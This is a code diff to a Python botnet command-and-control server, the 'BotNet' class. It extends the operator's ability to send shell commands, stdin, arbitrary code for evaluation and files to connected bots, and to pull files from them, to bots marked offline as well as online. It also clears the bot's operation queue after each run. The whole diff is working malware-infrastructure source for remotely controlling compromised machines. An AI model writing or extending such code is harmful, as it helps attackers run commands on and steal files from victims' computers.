@@ -39,6 +39,12 @@ class BotNet(Thread):
         self.payloadmanager = BotNetPayloadManager(payloadpath)
         self.downloaddir = downloadpath
 
+    def hasConnection(self, user):
+        with self.connlock:
+            if user in self.offlineConnections:
+                return True
+            return user in self.onlineConnections
+
     def addConnection(self, user, clientsock, host_info, socketio):
         print("[*] Adding connection {}".format(user))
         with self.connlock:
@@ -235,6 +241,11 @@ class BotNet(Thread):
                 self.logs[user].logstdin(cmd)
                 self.onlineConnections[user].send(cmd, sendtype="stdin")
                 return True
+            elif user in self.offlineConnections:
+                print("Sending offline")
+                self.logs[user].logstdin(cmd)
+                self.offlineConnections[user].send(cmd, sendtype="stdin")
+                return True
             self.socketio.emit('response',
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
             return False
@@ -245,6 +256,10 @@ class BotNet(Thread):
                 self.logs[user].logsdin("(cmd \""+cmd+"\")")
                 self.onlineConnections[user].send(cmd, sendtype="cmd")
                 return True
+            elif user in self.offlineConnections:
+                self.logs[user].logsdin("(cmd \""+cmd+"\")")
+                self.offlineConnections[user].send(cmd, sendtype="cmd")
+                return True
             self.socketio.emit('response',
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
             return False
@@ -253,6 +268,9 @@ class BotNet(Thread):
         with self.connlock:
             if user in self.onlineConnections:
                 self.onlineConnections[user].send(cmd, sendtype="eval")
+                return True
+            elif user in self.offlineConnections:
+                self.offlineConnections[user].send(cmd, sendtype="eval")
                 return True
             self.socketio.emit('response',
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
@@ -263,6 +281,9 @@ class BotNet(Thread):
             if user in self.onlineConnections:
                 self.onlineConnections[user].sendFile(filename, fileobj)
                 return True
+            elif user in self.offlineConnections:
+                self.offlineConnections[user].sendFile(filename, fileobj)
+                return True
             self.socketio.emit('response',
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
             return False
@@ -272,6 +293,10 @@ class BotNet(Thread):
             if user in self.onlineConnections:
                 if not self.filemanager.fileIsDownloading(user, filename):
                     self.onlineConnections[user].startFileDownload(filename)
+                return True
+            elif user in self.offlineConnections:
+                if not self.filemanager.fileIsDownloading(user, filename):
+                    self.offlineConnections[user].startFileDownload(filename)
                 return True
             return None
 
@@ -372,6 +397,7 @@ class Bot:
                 for runop in self.opqueue:
                     func, args = runop
                     func(*args)
+                self.opqueue.clear()
 
     def setip(self, ip):
         with self.datalock:
